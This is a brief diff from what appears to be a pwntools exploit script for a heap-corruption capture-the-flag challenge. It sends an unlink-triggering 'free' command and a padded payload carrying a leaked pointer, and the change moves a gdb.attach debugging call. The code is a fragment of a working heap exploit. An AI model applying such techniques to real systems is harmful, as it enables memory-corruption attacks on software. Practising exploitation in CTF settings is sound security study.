@@ -52,10 +52,12 @@ p.sendline("free 1") # unlink
 # and if we write a pointer to 0x404140, the pointer that points to a certain new location, would replace 0x404128 and become the again, a new starting location of the data section of our real chunk (chunk0)
 
 
-gdb.attach(p, s)
+
 
 p.sendline("read 0 3000") 
 p.sendline(b'A' * 24 + p64(leak))
+
+gdb.attach(p, s)
 
 p.sendline("puts 0")
 
